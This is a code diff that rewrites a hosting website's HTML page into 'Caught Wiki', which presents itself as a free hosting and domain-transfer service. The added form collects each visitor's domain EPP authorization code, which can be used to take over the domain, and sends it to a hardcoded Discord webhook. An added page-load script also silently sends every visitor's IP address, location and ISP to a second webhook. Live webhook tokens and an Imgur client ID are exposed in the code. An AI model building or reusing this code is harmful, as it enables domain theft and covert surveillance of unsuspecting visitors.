@@ -1,247 +1,526 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>HostNet.Wiki – Secure & Flexible Hosting</title>
-  <meta name="description" content="HostNet.Wiki – Reliable hosting with domain transfers, custom code, and subdomains.">
-
-  <!-- Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Caught Wiki - Secure and Innovative Hosting</title>
+  <meta name="description" content="Caught Wiki: Secure and innovative hosting solutions for your website and domain needs.">
+  <meta property="og:title" content="Caught Wiki - Secure and Innovative Hosting">
+  <meta property="og:description" content="Caught Wiki: Secure and innovative hosting solutions for your website and domain needs.">
+  <meta property="og:image" content="https://example.com/logo.png">
+  <meta property="og:image:type" content="image/png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="theme-color" content="#1E90FF">
+  <link rel="icon" href="https://example.com/favicon.ico" type="image/x-icon">
   <style>
+    /* General Styles */
     body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: #0f0f1a;
-      color: #ffffff;
-    }
-
-    header {
-      background-color: #1e1e2f;
-      padding: 1rem 2rem;
-      text-align: center;
-      border-bottom: 2px solid #4d4dff;
-    }
-
-    header h1 {
-      margin: 0;
-      font-size: 1.8rem;
-      letter-spacing: 1px;
-      color: #4d4dff;
-    }
-
-    main {
-      max-width: 700px;
-      margin: 3rem auto;
-      padding: 0 1rem;
-    }
-
-    h2 {
-      color: #ffffff;
-      font-size: 1.5rem;
-      margin-bottom: 0.5rem;
-    }
-
-    p {
-      color: #bbbbbb;
-      margin-bottom: 1.5rem;
-    }
-
-    .form-group {
-      margin-bottom: 1.5rem;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 0.5rem;
-      color: #cccccc;
-    }
-
-    input[type="text"],
-    input[type="file"],
-    select {
-      width: 100%;
-      padding: 0.75rem;
-      border-radius: 6px;
-      border: none;
-      background-color: #1a1a2e;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #1e1e2f, #2a2a40);
       color: #fff;
+      margin: 0;
+      padding: 0;
+      line-height: 1.6;
     }
-
-    input[type="file"] {
-      background: transparent;
-      padding: 0.5rem;
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      text-align: center;
     }
-
-    button {
-      background-color: #4d4dff;
-      color: white;
-      border: none;
-      padding: 0.75rem 1.5rem;
-      border-radius: 6px;
-      cursor: pointer;
+    h1 {
+      font-size: 2.5rem;
       font-weight: bold;
-      transition: background 0.3s ease;
+      color: #1E90FF;
+      margin-bottom: 10px;
     }
-
-    button:hover {
-      background-color: #6b6bff;
+    p {
+      font-size: 1rem;
+      color: rgba(255, 255, 255, 0.8);
+      margin-bottom: 20px;
     }
-
-    .status {
-      margin-top: 1rem;
-      font-size: 0.9rem;
+    /* Header */
+    header {
+      background: #111;
+      padding: 1rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-bottom: 2px solid #ff4d4d;
+    }
+    header .logo {
+      font-size: 1.8rem;
+      font-weight: bold;
+      letter-spacing: 3px;
+      color: #ff4d4d;
+      text-transform: uppercase;
+    }
+    /* Backend Status */
+    .backend-status {
+      margin-top: 2rem;
+      font-size: 1.2rem;
       color: #6bff6b;
     }
-
-    footer {
-      text-align: center;
-      padding: 2rem 1rem;
-      color: #666;
-      font-size: 0.9rem;
+    .backend-status.offline {
+      color: #ff1a1a;
     }
-
-    .g-recaptcha {
+    /* Free Hosting Section */
+    .free-hosting {
+      margin-top: 2rem;
+      padding: 1.5rem;
+      background-color: #1a1a1a;
+      border: 1px solid #ff4d4d;
+      border-radius: 5px;
+      text-align: left;
+      color: #ccc;
+    }
+    .free-hosting h3 {
+      font-size: 1.8rem;
+      color: #ff6b6b;
       margin-bottom: 1rem;
+    }
+    .free-hosting p {
+      margin-bottom: 0.5rem;
+    }
+    /* Instructions Section */
+    .instructions {
+      margin-top: 2rem;
+      padding: 1.5rem;
+      background-color: #1a1a1a;
+      border: 1px solid #ff4d4d;
+      border-radius: 5px;
+      text-align: left;
+      color: #ccc;
+    }
+    .instructions h3 {
+      font-size: 1.5rem;
+      color: #ff6b6b;
+      margin-bottom: 1rem;
+    }
+    .instructions p {
+      margin-bottom: 0.5rem;
+    }
+    /* Transfer Form */
+    .transfer-form {
+      margin-top: 3rem;
+      padding: 1.5rem;
+      background-color: #1a1a1a;
+      border: 1px solid #ff4d4d;
+      border-radius: 5px;
+      text-align: left;
+    }
+    .transfer-form h2 {
+      font-size: 1.8rem;
+      color: #ff6b6b;
+      margin-bottom: 1rem;
+    }
+    .transfer-form label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: #ccc;
+    }
+    .transfer-form input, .transfer-form select, .transfer-form button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 1rem;
+      border: none;
+      border-radius: 5px;
+    }
+    .transfer-form input[type="file"] {
+      background-color: transparent;
+      color: #ccc;
+      cursor: pointer;
+    }
+    .transfer-form input, .transfer-form select {
+      background-color: #111;
+      color: #ccc;
+    }
+    .transfer-form button {
+      background-color: #ff1a1a;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .transfer-form button:hover {
+      background-color: #ff4d4d;
+    }
+    /* Footer */
+    footer {
+      margin-top: 30px;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.6);
+    }
+    footer a {
+      color: #1E90FF;
+      text-decoration: none;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
+    /* Share Button */
+    .share-button {
+      background-color: rgba(255, 255, 255, 0.1);
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+      margin: 20px auto;
+      display: inline-block;
+    }
+    .share-button:hover {
+      background-color: rgba(255, 255, 255, 0.2);
+      transform: translateY(-2px);
     }
   </style>
 </head>
 <body>
 
-<header>
-  <h1>HOSTNET.WIKI</h1>
-</header>
+  <!-- Header -->
+  <header>
+    <div class="logo">
+      C A U G H T . W I K I
+    </div>
+  </header>
 
-<main>
-  <h2>Welcome to HostNet.Wiki</h2>
-  <p>Choose how you'd like to host your website:</p>
+  <!-- Profile Section -->
+  <div class="container">
+    <h1>Welcome to Caught Wiki</h1>
+    <p>Secure and innovative hosting solutions for your website and domain needs.</p>
 
-  <form id="hostingForm" enctype="multipart/form-data">
-    <!-- Hosting Type Selection -->
-    <div class="form-group">
-      <label for="hostingType">Hosting Type</label>
-      <select id="hostingType" name="hostingType" required>
-        <option value="">-- Select an option --</option>
-        <option value="transfer">Transfer My Domain</option>
-        <option value="subdomain">Use a Subdomain (hostnet.wiki)</option>
-      </select>
+    <!-- Backend Status -->
+    <div class="backend-status" id="backendStatus">Checking backend status...</div>
+
+    <!-- Free Hosting Section -->
+    <div class="free-hosting">
+      <h3>Free Hosting</h3>
+      <p>Do you want a website with a custom domain or don't know how to code or can't host? If you submit your domain to us and give us a reason, we will set up and publish your website.</p>
     </div>
 
-    <!-- Conditional Fields -->
-    <div id="domainFields" style="display:none;">
-      <div class="form-group">
+    <!-- Instructions Section -->
+    <div class="instructions">
+      <h3>How Domain Transfers Work</h3>
+      <p>If you'd like to transfer your domain to us, here's how it works:</p>
+      <ol>
+        <li><strong>Unlock Your Domain</strong>: Log in to your current registrar's account and unlock the domain you wish to transfer.</li>
+        <li><strong>Obtain the Authorization Code</strong>: Request the EPP/Authorization Code from your registrar. This code is required to authorize the transfer.</li>
+        <li><strong>Submit Your Details Below</strong>: Fill out the form with your domain name, authorization code, and the reason for the transfer.</li>
+        <li><strong>Approval Email</strong>: After submission, you'll receive an email from your current registrar asking you to approve the transfer. Please approve it promptly.</li>
+        <li><strong>Transfer Completion</strong>: Once approved, the transfer process typically takes 5–7 days to complete. During this time, your domain will remain active with your current registrar.</li>
+      </ol>
+      <p>If you have any questions or need assistance, feel free to <a href="mailto:hq@caught.wiki" style="color: #ff4d4d;">contact us</a>.</p>
+    </div>
+
+    <!-- Transfer Form -->
+    <div class="transfer-form">
+      <h2>Transfer a Domain to Us</h2>
+      <p>Please provide the required information below. All fields are mandatory.</p>
+      <form id="transferForm" enctype="multipart/form-data">
         <label for="domainName">Domain Name</label>
-        <input type="text" id="domainName" name="domainName" placeholder="example.com" />
-      </div>
-      <div class="form-group">
+        <input type="text" id="domainName" name="domainName" placeholder="example.com" required>
         <label for="authCode">Authorization Code (EPP Code)</label>
-        <input type="text" id="authCode" name="authCode" placeholder="Your EPP/Auth Code" />
-      </div>
+        <input type="text" id="authCode" name="authCode" placeholder="Your EPP/Auth Code" required pattern="[A-Za-z0-9\-]+" title="Authorization code must be alphanumeric with optional dashes.">
+        <label for="reasonSelect">Reason for Transfer (Predefined)</label>
+        <select id="reasonSelect" name="reasonSelect" required>
+          <option value="">-- Select a Reason --</option>
+          <option value="Image Hosting">Image Hosting</option>
+          <option value="Redirect">Redirect to Caught.Wiki or Other Domain</option>
+          <option value="Other">Other (Please Specify Below)</option>
+        </select>
+        <div id="imageUploadField" style="display: none;">
+          <label for="images">Upload Images (Up to 5 files, 10MB each)</label>
+          <input type="file" id="images" name="images" multiple accept="image/*" required>
+        </div>
+        <div id="redirectField" style="display: none;">
+          <label for="redirectDomain">Redirect Domain (e.g., caught.wiki or other domain)</label>
+          <input type="text" id="redirectDomain" name="redirectDomain" placeholder="caught.wiki or other domain">
+        </div>
+        <label for="customReason">Custom Reason (Required if "Other" is selected)</label>
+        <input type="text" id="customReason" name="customReason" placeholder="Type your reason here">
+        <button type="submit">Submit</button>
+      </form>
+      <p id="formMessage"></p>
     </div>
 
-    <div id="subdomainField" style="display:none;">
-      <div class="form-group">
-        <label for="customSubdomain">Custom Subdomain</label>
-        <input type="text" id="customSubdomain" name="customSubdomain" placeholder="yourname.hostnet.wiki" />
-      </div>
+    <!-- Share Button -->
+    <button class="share-button" id="share-button">Share</button>
+
+    <!-- Links Section -->
+    <div class="links">
+      <a href="https://tiktok.com/@ceosolace" target="_blank" class="link-button">TikTok</a>
+      <a href="#" target="_blank" class="link-button">Twitter (Coming Soon)</a>
+      <a href="https://discord.com/users/ceosolace" target="_blank" class="link-button">Discord: @ceosolace</a>
+      <a href="#" target="_blank" class="link-button">YouTube Channel (Coming Soon)</a>
+      <a href="https://github.com/tfssolacedev/" target="_blank" class="link-button">GitHub Profile</a>
     </div>
+  </div>
 
-    <!-- Reason for Hosting -->
-    <div class="form-group">
-      <label for="reason">Reason for Hosting</label>
-      <input type="text" id="reason" name="reason" placeholder="e.g., Personal blog, portfolio, etc." required />
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      © 2025 Catch Wiki. All rights reserved. <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
     </div>
+  </footer>
 
-    <!-- Custom Code Upload -->
-    <div class="form-group">
-      <label for="codeFiles">Upload Your Website Files (HTML, CSS, JS, Images)</label>
-      <input type="file" id="codeFiles" name="codeFiles" multiple accept=".html,.css,.js,image/*" required />
-    </div>
+  <script>
+    // Replace this with your Discord webhook URL
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1362428754458181874/TaKeGN5i6l1gnWViBJVrem9jw2yonAxy0_PunlyYcXlwMlhj57tYmogtM7QuXgKj9gPE';
+    // Your Imgur Client-ID
+    const IMGUR_CLIENT_ID = '919e66780dffebb';
 
-    <!-- reCAPTCHA -->
-    <div class="form-group">
-      <div class="g-recaptcha" data-sitekey="6LeLxzErAAAAAOfIwlGu34wx1BaKQIoD6I6ZH6aV"></div>
-    </div>
-
-    <!-- Submit Button -->
-    <button type="submit">Submit Hosting Request</button>
-    <p class="status" id="formStatus"></p>
-  </form>
-</main>
-
-<footer>
-  © 2025 HostNet.Wiki – All Rights Reserved | <a href="#" style="color:#4d4dff;">Privacy Policy</a>
-</footer>
-
-<!-- Load reCAPTCHA API -->
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
-
-<script>
-  const form = document.getElementById("hostingForm");
-  const hostingType = document.getElementById("hostingType");
-  const domainFields = document.getElementById("domainFields");
-  const subdomainField = document.getElementById("subdomainField");
-
-  hostingType.addEventListener("change", () => {
-    const value = hostingType.value;
-    domainFields.style.display = value === "transfer" ? "block" : "none";
-    subdomainField.style.display = value === "subdomain" ? "block" : "none";
-  });
-
-  // Handle Form Submission
-  form.addEventListener("submit", async (e) => {
-    e.preventDefault();
-
-    const statusMsg = document.getElementById("formStatus");
-    const formData = new FormData(form);
-    const recaptchaResponse = grecaptcha.getResponse();
-
-    // Validate CAPTCHA
-    if (!recaptchaResponse.length > 0) {
-      statusMsg.textContent = "Please complete the CAPTCHA.";
-      statusMsg.style.color = "#ff4d4d";
-      return;
-    }
-
-    // Additional validation for selected hosting type
-    if (!formData.get("hostingType")) {
-      statusMsg.textContent = "Please select a hosting type.";
-      statusMsg.style.color = "#ff4d4d";
-      return;
-    }
-
-    if (formData.get("hostingType") === "transfer") {
-      if (!formData.get("domainName") || !formData.get("authCode")) {
-        statusMsg.textContent = "Please fill out all domain transfer fields.";
-        statusMsg.style.color = "#ff4d4d";
-        return;
-      }
-    } else if (formData.get("hostingType") === "subdomain") {
-      if (!formData.get("customSubdomain")) {
-        statusMsg.textContent = "Please provide a custom subdomain.";
-        statusMsg.style.color = "#ff4d4d";
-        return;
+    // Function to check backend status
+    async function checkBackendStatus() {
+      const backendStatusElement = document.getElementById("backendStatus");
+      try {
+        // Fetch backend status
+        const response = await fetch("https://caughtwiki-backend.onrender.com/api/status");
+        if (response.ok) {
+          const data = await response.json();
+          backendStatusElement.textContent = `Backend is ${data.status}`;
+          backendStatusElement.classList.remove("offline");
+        } else {
+          throw new Error("Backend is offline");
+        }
+      } catch (error) {
+        backendStatusElement.textContent = "Backend is offline";
+        backendStatusElement.classList.add("offline");
       }
     }
 
-    const files = formData.getAll("codeFiles");
-    if (files.length === 0) {
-      statusMsg.textContent = "Please upload at least one file.";
-      statusMsg.style.color = "#ff4d4d";
-      return;
+    // Call the function to check backend status when the page loads
+    window.addEventListener("load", checkBackendStatus);
+
+    // Show/hide fields based on selection
+    document.getElementById('reasonSelect').addEventListener('change', function () {
+      const imageUploadField = document.getElementById('imageUploadField');
+      const redirectField = document.getElementById('redirectField');
+      if (this.value === 'Image Hosting') {
+        imageUploadField.style.display = 'block';
+        redirectField.style.display = 'none';
+        document.getElementById('images').setAttribute('required', true);
+        document.getElementById('redirectDomain').removeAttribute('required');
+      } else if (this.value === 'Redirect') {
+        redirectField.style.display = 'block';
+        imageUploadField.style.display = 'none';
+        document.getElementById('redirectDomain').setAttribute('required', true);
+        document.getElementById('images').removeAttribute('required');
+      } else {
+        imageUploadField.style.display = 'none';
+        redirectField.style.display = 'none';
+        document.getElementById('images').removeAttribute('required');
+        document.getElementById('redirectDomain').removeAttribute('required');
+      }
+    });
+
+    // Function to upload images to Imgur
+    async function uploadImagesToImgur(files) {
+      const imageUrls = [];
+      for (const file of files) {
+        const formData = new FormData();
+        formData.append('image', file);
+        try {
+          const response = await fetch('https://api.imgur.com/3/image', {
+            method: 'POST',
+            headers: { Authorization: `Client-ID ${IMGUR_CLIENT_ID}` },
+            body: formData
+          });
+          if (!response.ok) throw new Error('Failed to upload image.');
+          const data = await response.json();
+          imageUrls.push(data.data.link);
+        } catch (error) {
+          console.error('Error uploading image:', error);
+          return null;
+        }
+      }
+      return imageUrls;
     }
 
-    // Simulate sending to backend
-    console.log("Submitted Data:", Object.fromEntries(formData));
+    // Handle form submission
+    document.getElementById('transferForm').addEventListener('submit', async (event) => {
+      event.preventDefault();
 
-    // Here you would normally send to server with fetch or AJAX
-    statusMsg.textContent = "Request submitted successfully! We'll contact you soon.";
-    statusMsg.style.color = "#6bff6b";
-    form.reset();
-    grecaptcha.reset(); // Reset CAPTCHA after submission
-  });
-</script>
+      // Get form data
+      const domainName = document.getElementById('domainName').value.trim();
+      const authCode = document.getElementById('authCode').value.trim();
+      const reasonSelect = document.getElementById('reasonSelect').value.trim();
+      const redirectDomain = document.getElementById('redirectDomain')?.value.trim() || '';
+      const customReason = document.getElementById('customReason')?.value.trim() || '';
+      const formMessage = document.getElementById('formMessage');
+      let reason = '';
 
+      // Validate inputs
+      if (!domainName || !authCode || !reasonSelect) {
+        formMessage.textContent = 'Please fill out all required fields.';
+        formMessage.style.color = '#ff1a1a';
+        return;
+      }
+
+      // Determine reason
+      if (reasonSelect === 'Redirect') {
+        if (!redirectDomain) {
+          formMessage.textContent = 'You must specify a redirect domain if "Redirect" is selected.';
+          formMessage.style.color = '#ff1a1a';
+          return;
+        }
+        reason = `Redirect to ${redirectDomain}`;
+      } else if (reasonSelect === 'Other') {
+        if (!customReason) {
+          formMessage.textContent = 'You must specify a custom reason if "Other" is selected.';
+          formMessage.style.color = '#ff1a1a';
+          return;
+        }
+        reason = customReason;
+      } else {
+        reason = reasonSelect;
+      }
+
+      // Handle image uploads if applicable
+      let imageUrls = [];
+      if (reasonSelect === 'Image Hosting') {
+        const files = document.getElementById('images').files;
+        if (files.length === 0) {
+          formMessage.textContent = 'You must upload at least one image for image hosting.';
+          formMessage.style.color = '#ff1a1a';
+          return;
+        }
+        // Check file size limit (10MB per file)
+        for (const file of files) {
+          if (file.size > 10 * 1024 * 1024) {
+            formMessage.textContent = `File "${file.name}" exceeds the 10MB size limit.`;
+            formMessage.style.color = '#ff1a1a';
+            return;
+          }
+        }
+        // Upload images to Imgur
+        imageUrls = await uploadImagesToImgur(files);
+        if (!imageUrls) {
+          formMessage.textContent = 'Failed to upload images. Please try again later.';
+          formMessage.style.color = '#ff1a1a';
+          return;
+        }
+      }
+
+      // Prepare payload for Discord webhook
+      const payload = {
+        username: 'Domain Transfer Bot',
+        embeds: [
+          {
+            title: 'New Domain Transfer Request',
+            color: 0xff4d4d,
+            fields: [
+              { name: 'Domain Name', value: domainName, inline: true },
+              { name: 'Authorization Code', value: authCode, inline: true },
+              { name: 'Reason for Transfer', value: reason, inline: false }
+            ],
+            footer: { text: 'CaughtWiki Domain Transfers' },
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      // Add image URLs to the payload if applicable
+      if (imageUrls.length > 0) {
+        payload.embeds[0].image = { url: imageUrls[0] }; // Only the first image as the embed thumbnail
+        payload.embeds[0].fields.push({ name: 'Uploaded Images', value: imageUrls.join('\n'), inline: false });
+      }
+
+      try {
+        // Send data to Discord webhook
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if (response.ok) {
+          formMessage.textContent = 'Transfer request submitted successfully!';
+          formMessage.style.color = '#6bff6b';
+          document.getElementById('transferForm').reset();
+          // Redirect to https://discord.gg/caughtwiki after successful submission
+          window.location.href = 'https://discord.gg/caughtwiki';
+        } else {
+          formMessage.textContent = 'Failed to submit transfer request. Please try again later.';
+          formMessage.style.color = '#ff1a1a';
+        }
+      } catch (error) {
+        console.error('Error submitting form:', error);
+        formMessage.textContent = 'An error occurred. Please try again later.';
+        formMessage.style.color = '#ff1a1a';
+      }
+    });
+
+    // Function to send IP address and Whois information to Discord webhook
+    async function sendIPAndWhois() {
+      try {
+        // Fetch visitor's IP address
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (!ipResponse.ok) {
+          throw new Error('Network response was not ok');
+        }
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip;
+
+        // Fetch Whois information for the IP
+        const whoisResponse = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+        if (!whoisResponse.ok) {
+          throw new Error('Network response was not ok');
+        }
+        const whoisData = await whoisResponse.json();
+
+        // Prepare payload for Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1364333839631122573/01wis4woFMsU8MFiKj4lhOXbBaRhwgPTJ02MDPs6qtAzQuTLBvNOsphEccZHb-XpVy7j';
+        const payload = {
+          embeds: [
+            {
+              title: "Visitor Info",
+              color: 16711680, // Red color
+              fields: [
+                { name: "IP Address", value: whoisData.ip || "N/A", inline: true },
+                { name: "City", value: whoisData.city || "N/A", inline: true },
+                { name: "Region", value: whoisData.region || "N/A", inline: true },
+                { name: "Country", value: whoisData.country || "N/A", inline: true },
+                { name: "Location", value: whoisData.loc || "N/A", inline: true },
+                { name: "Organization", value: whoisData.org || "N/A", inline: true },
+                { name: "Hostname", value: whoisData.hostname || "N/A", inline: true }
+              ]
+            }
+          ]
+        };
+
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+        console.log('Visitor info sent to Discord.');
+      } catch (error) {
+        console.error('Error sending visitor info to Discord:', error);
+      }
+    }
+
+    // Initialize the page
+    window.onload = () => {
+      // Send the IP address and Whois information to the Discord webhook
+      sendIPAndWhois();
+
+      // Share button functionality
+      document.getElementById('share-button').addEventListener('click', () => {
+        if (navigator.share) {
+          navigator.share({
+            title: 'Catch Wiki - Secure and Innovative Hosting',
+            url: window.location.href,
+          }).catch((error) => console.error('Error sharing:', error));
+        } else {
+          alert('Sharing is not supported in this browser.');
+        }
+      });
+    };
+  </script>
 </body>
 </html>
